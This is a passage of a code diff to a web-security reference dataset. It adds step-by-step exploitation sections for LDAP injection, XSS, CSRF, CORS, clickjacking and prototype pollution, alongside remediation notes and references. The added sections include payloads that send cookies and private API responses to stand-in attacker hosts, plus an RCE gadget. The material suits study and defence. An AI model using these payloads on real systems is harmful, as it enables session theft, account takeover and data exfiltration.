+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — XXE injection", url: "https://portswigger.net/web-security/xxe" },
+              { label: "OWASP — XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Disable external entity and DTD processing in the XML parser — this is the definitive fix, and most libraries expose a single flag for it.",
-              "Prefer less complex data formats (JSON) where XML is not required.",
-              "Patch and configure the XML library; defaults vary and older versions are often unsafe.",
-              "Validate and sanitise uploaded files that are XML-based (SVG, Office documents) before parsing.",
-              "Apply least privilege and network egress controls so a successful XXE reads little and reaches nothing internal."
+              "Disable external entity and DTD processing in the XML parser — the definitive fix, usually one flag.",
+              "Prefer JSON where XML is not required; patch and harden the XML library (defaults vary).",
+              "Validate/sanitise uploaded XML-based files (SVG, Office documents) before parsing.",
+              "Apply least privilege and egress controls so a successful XXE reads little and reaches nothing internal."
             ]
           }
         ]
@@ -341,64 +423,81 @@ var VULNS = [
         name: "LDAP Injection",
         severity: "High",
         ref: "https://owasp.org/www-community/attacks/LDAP_Injection",
-        description: "Unsanitised input in an LDAP filter alters directory queries, enabling auth bypass and information disclosure.",
-        brief: "LDAP injection is the directory-service cousin of SQL injection. When an application builds an LDAP search filter from user input without escaping the special filter characters, an attacker can rewrite the filter — bypassing authentication, enumerating directory objects, or extracting attributes they should not see.\n\nIt appears wherever an app authenticates or searches against a directory (corporate logins, address books, user lookups) using string-built filters.",
+        description: "Unsanitised input in an LDAP filter alters directory queries, enabling authentication bypass and information disclosure.",
+        brief: "LDAP injection is the directory-service cousin of SQLi. When an application builds an LDAP search filter from user input without escaping the special filter characters, an attacker rewrites the filter.\n\nImpact: bypass authentication, enumerate directory objects, and extract attributes character by character. It appears wherever an app authenticates or searches against a directory (SSO, address books, user lookups) using string-built filters.",
         quickReference: [
-          { label: "Auth bypass (always-true filter)", cmd: "*)(uid=*))(|(uid=*     or simply  *" },
-          { label: "Wildcard enumeration", cmd: "admin*     a*     (walk the alphabet to enumerate)" },
+          { label: "Auth bypass (always-true)", cmd: "*)(uid=*))(|(uid=*     or simply   *" },
+          { label: "Wildcard enumeration", cmd: "admin*   a*   (walk the alphabet)" },
           { label: "Blind attribute extraction", cmd: "*)(mail=a*)   vary the pattern, watch the response" },
-          { label: "Special chars to escape/abuse", cmd: "( ) * \\ NUL / &  |" }
+          { label: "Special chars", cmd: "( ) * \\ NUL /" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Probe with a wildcard / filter break", cmd: "# a login/search form that builds (&(uid=INPUT)(password=INPUT))\nuser=*            # returns everyone / logs in?\nuser=*)(uid=*     # filter break -> LDAP error or changed results = injectable" },
+              { label: "2. Authentication bypass — force an always-true filter", cmd: "# inject to make the bind/search match unconditionally\nuser=admin)(&))     # closes the clause, injects an always-true condition\nuser=*)(uid=*))(|(uid=*" },
+              { label: "3. Blind extraction with wildcards", cmd: "# vary a wildcard pattern and watch which requests succeed\nuser=admin)(mail=a*)   # true if a mail attribute starts with 'a'\n# walk the alphabet per position to reconstruct values" },
+              { label: "4. Enumerate objects / privileged groups", cmd: "# where results are reflected, inject filters to list users, groups, admins\n*)(objectClass=*)   # broadens the match to enumerate the directory" }
+            ]
+          },
           {
             title: "How the Filter Breaks",
             type: "table",
             columns: ["Input", "Effect"],
             rows: [
-              ["*", "Wildcard — matches any value, the basis of most LDAP injections"],
+              ["*", "Wildcard — matches any value"],
               [")(  and  (|", "Close the current clause and inject a new OR condition"],
-              ["*)(uid=*))(|(uid=*", "A classic filter break that makes the search always match"],
-              ["No escaping", "The app inserts input straight into (&(uid=INPUT)(password=INPUT))"]
+              ["*)(uid=*))(|(uid=*", "A classic break making the search always match"],
+              ["No escaping", "Input goes straight into (&(uid=INPUT)(password=INPUT))"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Signal", "Test"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Login/lookup forms", "Anything that searches a directory: SSO, address book, admin user search"],
-              ["Wildcard behaviour", "A single * returns everyone or logs you in"],
-              ["Filter break", "Injecting )( or *)( changes results or causes an LDAP error"],
-              ["Boolean/blind", "Vary a wildcard pattern and watch which requests succeed to extract values"]
+              ["1", "Find a directory-backed form", "Candidate LDAP filter"],
+              ["2", "Break the filter / inject a wildcard", "Confirm injection"],
+              ["3", "Force an always-true filter", "Authentication bypass"],
+              ["4", "Blind-extract attributes", "User/credential disclosure"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Authentication bypass", "An always-true filter logs in without valid credentials"],
-              ["Information disclosure", "Enumerate users, groups, and read attributes character by character"],
-              ["Privilege discovery", "Reveal admin accounts and group memberships"],
-              ["Directory tampering", "Rare, but possible where write operations build filters unsafely"]
+              ["Burp Suite", "Manual filter-break testing and blind extraction"],
+              ["ldapsearch", "Validate directory behaviour and craft filters"],
+              ["custom scripts", "Automate wildcard-based blind extraction"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — LDAP Injection", url: "https://owasp.org/www-community/attacks/LDAP_Injection" },
+              { label: "PayloadsAllTheThings — LDAP Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Escape all LDAP special characters in user input using the framework's LDAP encoding routine before building a filter.",
+              "Escape all LDAP special characters using the framework's LDAP encoding routine before building a filter.",
               "Use parameterised LDAP APIs / safe filter builders rather than string concatenation.",
               "Bind with least privilege and never build the bind DN or filter from raw input.",
-              "Validate input against an allow-list where the format is known (usernames, IDs).",
-              "Do not authenticate by searching with a user-supplied password in the filter; use a proper bind operation."
+              "Authenticate with a proper bind operation, not by searching with a user-supplied password in the filter.",
+              "Validate input against an allow-list where the format is known."
             ]
           }
         ]
       }
     ]
   },
-  {
+    {
     category: "Cross-Site & Client-Side",
     vulns: [
       {
@@ -407,14 +506,25 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/cross-site-scripting",
         description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
-        brief: "XSS occurs when an application includes untrusted data in a page without correct encoding, so the browser executes it as script. The attacker's JavaScript then runs in the victim's session — reading cookies and tokens, making authenticated requests, keylogging, or rewriting the page.\n\nIt is the most widespread web vulnerability class. The three forms differ in where the injection lives and how it reaches the victim, but the fix is the same principle everywhere: encode on output, in the correct context.",
+        brief: "XSS occurs when an application includes untrusted data in a page without correct encoding, so the browser executes it as script. The attacker's JavaScript then runs in the victim's session — reading cookies and tokens, making authenticated requests, keylogging, or rewriting the page.\n\nImpact: session hijacking, account takeover, credential theft, and full control of the victim's interaction with the site. It is the most widespread web vulnerability class; the fix everywhere is the same principle — encode on output, in the correct context.",
         quickReference: [
-          { label: "Basic reflected probe", cmd: "<script>alert(document.domain)</script>" },
+          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>" },
           { label: "Attribute / tag break-out", cmd: "\"><img src=x onerror=alert(1)>     '-alert(1)-'" },
-          { label: "Common no-script vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <body onpageshow=alert(1)>" },
+          { label: "No-script vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <body onpageshow=alert(1)>" },
           { label: "Session theft (concept)", cmd: "<script>fetch('//attacker/?c='+document.cookie)</script>" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Inject a unique marker and find the reflection", cmd: "# reflect a harmless string and locate where/how it appears\nq=xss7411test\n# search the response and DOM: is it in HTML body, an attribute, a <script>, or written by JS?" },
+              { label: "2. Identify the context — it dictates the payload", cmd: "# HTML body     -> inject a tag:        <svg onload=alert(1)>\n# HTML attribute -> close it first:      \"><svg onload=alert(1)>\n# inside <script>-> break the string:    ';alert(1)//\n# href / URL     -> scheme:              javascript:alert(1)" },
+              { label: "3. Adapt to filters", cmd: "# test which of  < > \" ' / ( )  are blocked or encoded, then bypass:\n<sVg OnLoad=alert(1)>              # case / tag variation\n<img src=x onerror=alert`1`>       # no parentheses (backticks)\n<svg onload=alert(1) //           # break malformed sanitisers" },
+              { label: "4. DOM XSS — trace source to sink", cmd: "# user-controlled source flows into a dangerous sink client-side\nlocation.hash / location.search  ->  innerHTML / document.write / eval\n# example sink:  el.innerHTML = location.hash.slice(1)\n# payload:  #<img src=x onerror=alert(1)>   (often never reaches the server)" },
+              { label: "5. Weaponise — steal the session / act as the victim", cmd: "# exfiltrate the cookie (if not HttpOnly):\n<script>new Image().src='//attacker/?c='+document.cookie</script>\n# or ride the session directly with a same-origin request:\n<script>fetch('/account/email',{method:'POST',body:'email=attacker@evil',credentials:'include'})</script>\n# blind/stored XSS: plant a callback payload where an admin will view it (XSS Hunter)" }
+            ]
+          },
           {
             title: "Types",
             type: "table",
@@ -427,27 +537,34 @@ var VULNS = [
             ]
           },
           {
-            title: "Context Determines Payload",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Reflection context", "Break-out"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["HTML body", "Inject a tag: <svg onload=...>, <img onerror=...>"],
-              ["HTML attribute", "Close the attribute/tag first: \"> then the tag"],
-              ["Inside <script>", "Break the JS string/expression: ';alert(1)//"],
-              ["URL / href", "javascript: scheme, or break out of the attribute"],
-              ["DOM sink", "innerHTML, document.write, eval, location — trace source to sink"]
+              ["1", "Reflect a marker, find where it lands", "Injection point + context"],
+              ["2", "Craft a context-appropriate payload", "Script executes in the browser"],
+              ["3", "Deliver to the victim (link or stored)", "Runs in the victim's session"],
+              ["4", "Steal cookies / make authenticated requests", "Session hijack / account takeover"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Tools Used",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Inject a unique marker", "Reflect a harmless string, find where and how it appears in the response/DOM"],
-              ["Identify the context", "HTML, attribute, script, or DOM — this dictates the payload"],
-              ["Test filtered chars", "See which of < > \" ' / are blocked or encoded, then adapt"],
-              ["DOM analysis", "Trace user-controlled sources into sinks in the JavaScript (or use DOM Invader / dalfox)"],
-              ["Blind XSS", "Plant a callback payload in fields an admin will later view"]
+              ["Burp Suite (+ DOM Invader)", "Manual probing, context analysis, DOM-XSS discovery"],
+              ["dalfox", "Automated XSS scanning and parameter analysis"],
+              ["XSS Hunter / Interactsh", "Blind XSS callbacks and out-of-band confirmation"],
+              ["DOMPurify (defence)", "Reference sanitiser for safe rich HTML"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Cross-site scripting", url: "https://portswigger.net/web-security/cross-site-scripting" },
+              { label: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
+              { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" }
             ]
           },
           {
@@ -469,7 +586,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/csrf",
         description: "A malicious site causes the victim's browser to send an authenticated state-changing request they never intended.",
-        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings without their knowledge.\n\nIt requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is to require an unpredictable, per-request token that a cross-site attacker cannot know.",
+        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings.\n\nImpact: account takeover and unwanted state changes performed as the victim. It requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is an unpredictable, per-request token a cross-site attacker cannot know.",
         quickReference: [
           { label: "Auto-submitting form (concept)", cmd: "<form action=//target/change-email method=POST>\n <input name=email value=attacker@evil>\n</form><script>document.forms[0].submit()</script>" },
           { label: "Test: remove the token", cmd: "Strip the CSRF token/param — if the action still succeeds, it's vulnerable" },
@@ -478,14 +595,14 @@ var VULNS = [
         ],
         sections: [
           {
-            title: "Preconditions",
-            type: "table",
-            columns: ["Condition", "Why it matters"],
-            rows: [
-              ["Cookie-based session", "The action authenticates via a cookie the browser sends automatically"],
-              ["State-changing action", "Something worth forging — email/password change, funds transfer, role change"],
-              ["No unpredictable token", "The request has no parameter the attacker cannot guess or obtain"],
-              ["Predictable request", "The attacker knows all fields needed to construct the request"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Find a state-changing request with weak protection", cmd: "# capture a sensitive action (change email/password, transfer, role change)\nPOST /account/change-email  email=user@corp\n# is it authorised by the session cookie alone, with no unguessable token?" },
+              { label: "2. Test whether the anti-CSRF control actually holds", cmd: "# remove the token entirely           -> still works?  vulnerable\n# use a token from another session     -> accepted?     not session-bound\n# change POST to GET                    -> honoured?     method not enforced\n# empty the token value                -> accepted?     validated only for presence" },
+              { label: "3. Build the forged request as an auto-submitting form", cmd: "<html><body>\n <form action=\"https://target/account/change-email\" method=\"POST\">\n   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n </form>\n <script>document.forms[0].submit()</script>\n</body></html>" },
+              { label: "4. GET-based actions are even simpler", cmd: "# if a GET changes state, an <img> tag alone fires it on page load:\n<img src=\"https://target/account/delete?confirm=true\">" },
+              { label: "5. Deliver and chain", cmd: "# host the page and lure the authenticated victim to it\n# chain: CSRF the email to one you control -> trigger password reset -> account takeover" }
             ]
           },
           {
@@ -501,14 +618,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Account takeover", "Force an email or password change, then reset"],
-              ["Unwanted state change", "Transfer funds, change settings, delete data as the victim"],
-              ["Privilege change", "Add an attacker account to a role where the victim is an admin"],
-              ["Chained impact", "CSRF a setting that enables a larger attack"]
+              ["1", "Find a cookie-authorised state change", "Candidate CSRF target"],
+              ["2", "Confirm the token is missing/weak", "Forgeable request"],
+              ["3", "Host an auto-submitting page", "Request fires from victim's session"],
+              ["4", "Change email/password, then reset", "Account takeover"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite", "Generate CSRF PoCs, test token validation logic"],
+              ["Browser + custom HTML", "Host and deliver the forged request"],
+              ["XSStrike / manual", "Chain with XSS to defeat token protection"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — CSRF", url: "https://portswigger.net/web-security/csrf" },
+              { label: "OWASP — CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" }
             ]
           },
           {
@@ -530,14 +665,25 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/cors",
         description: "An over-permissive cross-origin policy lets a malicious site read authenticated responses from the target.",
-        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nUnlike CSRF (which can send but not read), a CORS misconfiguration can leak the response body — session-bound data, tokens, and PII — to an attacker-controlled page.",
+        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nImpact: theft of session-bound data, tokens, and PII directly from authenticated API responses. Unlike CSRF (which can send but not read), a CORS misconfiguration leaks the response body to an attacker-controlled page.",
         quickReference: [
-          { label: "The dangerous combo to look for", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
+          { label: "The dangerous combo", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
           { label: "Test: reflected origin", cmd: "Send  Origin: https://evil.com  — is it echoed back in ACAO?" },
           { label: "Test: null origin", cmd: "Origin: null  — accepted? Reachable from a sandboxed iframe" },
           { label: "Weak regex", cmd: "Origin: https://target.com.evil.com  or  https://eviltarget.com — does a substring match pass?" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Send a rogue Origin and read the response headers", cmd: "curl -s -I 'https://target/api/account' -H 'Origin: https://evil.com' -b 'session=<cookie>'\n# vulnerable if the response reflects it:\n#   Access-Control-Allow-Origin: https://evil.com\n#   Access-Control-Allow-Credentials: true" },
+              { label: "2. Probe weak allow-list logic", cmd: "# try each and inspect ACAO:\nOrigin: null                          # accepted? -> sandboxed iframe delivery\nOrigin: https://target.com.evil.com   # suffix trick passes a naive endsWith\nOrigin: https://eviltarget.com        # prefix/substring match\nOrigin: https://sub.target.com        # all-subdomains trust + one subdomain XSS" },
+              { label: "3. Build a PoC that reads authenticated data", cmd: "<script>\n fetch('https://target/api/account', {credentials:'include'})\n   .then(r => r.text())\n   .then(d => fetch('https://attacker/collect?d=' + encodeURIComponent(d)));\n</script>\n# victim visits -> their private API response is exfiltrated to you" },
+              { label: "4. null-origin variant via a sandboxed iframe", cmd: "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>\n fetch('https://target/api/account',{credentials:'include'})\n   .then(r=>r.text()).then(d=>location='https://attacker/?d='+btoa(d));\n</script>\"></iframe>   # forces Origin: null" },
+              { label: "5. Escalate with the leaked material", cmd: "# read a CSRF token / API key from the response, then perform actions as the victim\n# or use leaked session data for further account compromise" }
+            ]
+          },
           {
             title: "Misconfiguration Patterns",
             type: "table",
@@ -551,24 +697,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Send a rogue Origin", "Add Origin: https://evil.com and inspect ACAO/ACAC in the response"],
-              ["Check credentials flag", "The impact hinges on Access-Control-Allow-Credentials: true"],
-              ["Probe the allow-list logic", "Try null, subdomains, prefix/suffix tricks to find lax matching"],
-              ["Confirm data read", "Build a PoC page that fetches with credentials and reads the response"]
+              ["1", "Send Origin: evil.com, inspect ACAO/ACAC", "Confirm reflected origin + credentials"],
+              ["2", "Host a fetch() PoC with credentials", "Cross-origin read of private data"],
+              ["3", "Lure the authenticated victim", "Response body exfiltrated"],
+              ["4", "Reuse leaked token/key", "Actions as the victim"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Sensitive data theft", "Read authenticated API responses — profile, tokens, keys"],
-              ["Session/token exfiltration", "Steal CSRF tokens or API keys returned in responses"],
-              ["Account actions", "Chain with the leaked token to perform actions as the victim"]
+              ["Burp Suite (CORS* checks)", "Detect reflected-origin and credentials misconfig"],
+              ["curl", "Quick header probing with a forged Origin"],
+              ["CORScanner / Corsy", "Automated CORS misconfiguration scanning"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — CORS", url: "https://portswigger.net/web-security/cors" },
+              { label: "PortSwigger — Exploiting CORS misconfigurations", url: "https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" }
             ]
           },
           {
@@ -590,7 +744,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/clickjacking",
         description: "The target page is framed invisibly so the victim's clicks land on it, triggering unintended actions.",
-        brief: "Clickjacking (UI redress) loads the target site in a transparent or disguised iframe over attacker-controlled content, so the victim thinks they are interacting with the attacker's page while their clicks actually hit the framed target. Combined with the victim's active session, this drives state-changing actions — enabling a setting, confirming a payment, granting an OAuth scope.\n\nThe defence is to refuse to be framed by untrusted origins, via frame-ancestors CSP or the legacy X-Frame-Options header.",
+        brief: "Clickjacking (UI redress) loads the target site in a transparent or disguised iframe over attacker-controlled content, so the victim thinks they are interacting with the attacker's page while their clicks actually hit the framed target. Combined with the victim's active session, this drives state-changing actions.\n\nImpact: unintended actions performed as the victim — enabling a setting, confirming a payment, granting an OAuth scope. The defence is to refuse to be framed by untrusted origins, via frame-ancestors CSP or the legacy X-Frame-Options header.",
         quickReference: [
           { label: "Test: can the page be framed?", cmd: "<iframe src=\"https://target.com/sensitive\"></iframe>  — does it render?" },
           { label: "Missing protections", cmd: "No  X-Frame-Options  and no  Content-Security-Policy: frame-ancestors" },
@@ -598,6 +752,17 @@ var VULNS = [
           { label: "Variant", cmd: "Drag-and-drop / cursor-jacking for multi-step actions" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Check the anti-framing headers", cmd: "curl -s -I 'https://target/account/settings' | grep -iE 'x-frame-options|content-security-policy'\n# no X-Frame-Options AND no frame-ancestors in CSP -> framable" },
+              { label: "2. Confirm it renders inside an iframe", cmd: "<iframe src=\"https://target/account/settings\" width=800 height=600></iframe>\n# if the real page loads (rather than being blocked), clickjacking is possible" },
+              { label: "3. Overlay a decoy over the sensitive control", cmd: "<style>\n iframe{position:absolute;top:0;left:0;width:800px;height:600px;opacity:0.0;z-index:2}\n .decoy{position:absolute;top:410px;left:300px;z-index:1}\n</style>\n<div class=\"decoy\"><button>Claim your free prize</button></div>\n<iframe src=\"https://target/account/enable-2fa-off\"></iframe>\n# align the invisible real button under the visible decoy" },
+              { label: "4. Multi-step variants", cmd: "# drag-and-drop 'cursorjacking' to fill fields, or chain frames\n# to walk a victim through a multi-click flow (e.g. OAuth consent)" },
+              { label: "5. Defeat weak JS frame-busting", cmd: "# if the page uses JS to break out of frames, neutralise it:\n<iframe sandbox=\"allow-forms allow-scripts\" src=\"https://target/...\"></iframe>\n# sandbox without allow-top-navigation blocks the frame-buster" }
+            ]
+          },
           {
             title: "Finding It",
             type: "table",
@@ -610,14 +775,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Unintended actions", "Toggle settings, confirm transactions, grant permissions"],
-              ["OAuth/consent hijack", "Trick the victim into approving an authorization prompt"],
-              ["Likejacking / follows", "Social actions performed without consent"],
-              ["Chained impact", "Enable a weaker setting that opens a larger attack"]
+              ["1", "Confirm missing frame protections", "Page is framable"],
+              ["2", "Overlay a decoy over a real control", "Clicks routed to the target"],
+              ["3", "Lure the authenticated victim to click", "State change fires in their session"],
+              ["4", "Chain to a larger weakness", "Escalated impact"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite (Clickbandit)", "Auto-generate a clickjacking PoC page"],
+              ["curl", "Header inspection for missing anti-framing controls"],
+              ["Browser + HTML/CSS", "Build and align the overlay proof"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Clickjacking", url: "https://portswigger.net/web-security/clickjacking" },
+              { label: "OWASP — Clickjacking Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" }
             ]
           },
           {
@@ -639,7 +822,7 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/prototype-pollution",
         description: "Injecting into Object.prototype in JavaScript, corrupting application behaviour up to XSS or RCE.",
-        brief: "Prototype pollution is a JavaScript-specific flaw where an attacker sets properties on Object.prototype via keys like __proto__ or constructor.prototype. Because nearly every object inherits from that prototype, a polluted property silently appears on objects across the application, changing logic that was never meant to be attacker-influenced.\n\nOn the client it can lead to DOM XSS; on the server (Node.js) it can corrupt config objects and, in the right conditions, reach command execution. It hides in recursive merges, object-path setters, and query-string parsers.",
+        brief: "Prototype pollution is a JavaScript-specific flaw where an attacker sets properties on Object.prototype via keys like __proto__ or constructor.prototype. Because nearly every object inherits from that prototype, a polluted property silently appears on objects across the application, changing logic that was never meant to be attacker-influenced.\n\nImpact: DOM XSS on the client, and on Node.js servers config corruption, security-flag bypass, denial of service, and — with the right gadget — command execution. It hides in recursive merges, object-path setters, and query-string parsers.",
         quickReference: [
           { label: "Client-side probe", cmd: "?__proto__[test]=polluted   then check  Object.prototype.test  in console" },
           { label: "JSON payload", cmd: "{\"__proto__\": {\"isAdmin\": true}}" },
@@ -647,6 +830,17 @@ var VULNS = [
           { label: "Gadget hunt", cmd: "Find a property the app reads but never sets — pollute it to change behaviour" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Pollute a test property and confirm inheritance", cmd: "# client-side, via the query string:\n?__proto__[claudetest]=polluted\n# then in the browser console:\nObject.prototype.claudetest   // 'polluted' -> vulnerable\n# server-side, via a JSON body to a merge endpoint:\n{\"__proto__\":{\"claudetest\":\"polluted\"}}" },
+              { label: "2. Try each pollution vector", cmd: "?__proto__[x]=y                 # bracket in query string\nconstructor[prototype][x]=y      # constructor path (when __proto__ is filtered)\n{\"__proto__\":{\"x\":\"y\"}}          # JSON key\n# any recursive merge / object-path set of user data is a candidate" },
+              { label: "3. Find a gadget — a property the code reads but never sets", cmd: "# search client scripts / server code for undefined-property reads:\n#   options.transport_url, config.shell, sanitizer.ALLOWED_ATTR, isAdmin\n# whichever the app trusts becomes the exploit primitive" },
+              { label: "4. Client gadget -> DOM XSS", cmd: "# many sanitisers/templates read config from an object you can pollute:\n?__proto__[hitCallback]=alert(document.domain)     # analytics gadget\n?__proto__[srcdoc][0]=<img/src/onerror=alert(1)>   # template gadget -> XSS" },
+              { label: "5. Server gadget -> RCE (Node)", cmd: "# pollute options later passed to child_process:\n{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}\n# or env/argv gadgets documented per-library -> command execution" }
+            ]
+          },
           {
             title: "Vulnerable Sinks",
             type: "table",
@@ -659,25 +853,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Environment", "Consequence"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Client (browser)", "DOM XSS when a polluted property flows into a script gadget (e.g. a sanitiser config)"],
-              ["Server (Node)", "Corrupt config/security flags (isAdmin, options), denial of service"],
-              ["Server (RCE)", "With the right gadget (e.g. child_process options), escalate to command execution"],
-              ["Logic bypass", "Flip a default-false property the app assumes is safe"]
+              ["1", "Pollute a test property", "Confirm prototype pollution"],
+              ["2", "Find a gadget the app reads", "A concrete exploit path"],
+              ["3", "Pollute the gadget property", "DOM XSS / flag bypass / RCE"],
+              ["4", "Escalate via the gadget's effect", "Client or server compromise"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Tools Used",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Pollute a test property", "Send __proto__[x]=y and check whether x appears on unrelated objects"],
-              ["Client detection", "DOM Invader (Burp) automates client-side prototype-pollution discovery"],
-              ["Find a gadget", "Locate a property the code reads but never assigns — that is the exploit path"],
-              ["Server probes", "Look for JSON merge endpoints and config-driven behaviour"]
+              ["Burp Suite (DOM Invader)", "Automated client-side prototype-pollution + gadget discovery"],
+              ["ppmap / silentspring", "Scan for pollution sources and known gadgets"],
+              ["Node.js REPL", "Validate server-side gadgets locally"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Prototype pollution", url: "https://portswigger.net/web-security/prototype-pollution" },
+              { label: "PayloadsAllTheThings — Prototype Pollution", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" }
             ]
           },
           {
@@ -699,7 +900,7 @@ var VULNS = [
         severity: "Low",
         ref: "https://cwe.mitre.org/data/definitions/601.html",
         description: "A redirect target taken from user input sends victims to attacker sites, aiding phishing and token theft.",
-        brief: "An open redirect exists when an application redirects to a URL taken from user-controllable input without validating it. On its own it is low severity — but it lends a trusted domain to phishing links, and it becomes serious when chained: leaking OAuth tokens or authorization codes via a redirect_uri, or bouncing through to an SSRF or XSS.\n\nThe fix is to never redirect to a raw user-supplied absolute URL; use an allow-list or relative paths only.",
+        brief: "An open redirect exists when an application redirects to a URL taken from user-controllable input without validating it. On its own it is low severity — but it lends a trusted domain to phishing links, and becomes serious when chained: leaking OAuth tokens or authorization codes via a loose redirect_uri, or bouncing through to SSRF or XSS.\n\nImpact: credible phishing under a trusted domain, and OAuth token/code theft when chained. The fix is to never redirect to a raw user-supplied absolute URL; use an allow-list or relative paths only.",
         quickReference: [
           { label: "Basic test", cmd: "?next=https://evil.com   ?url=//evil.com   ?redirect=https:evil.com" },
           { label: "Filter bypasses", cmd: "//evil.com   https:/\\evil.com   https://target.com@evil.com   /\\/evil.com" },
@@ -707,6 +908,17 @@ var VULNS = [
           { label: "Where to look", cmd: "Login/logout next=, return_to, callback, url, dest parameters" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
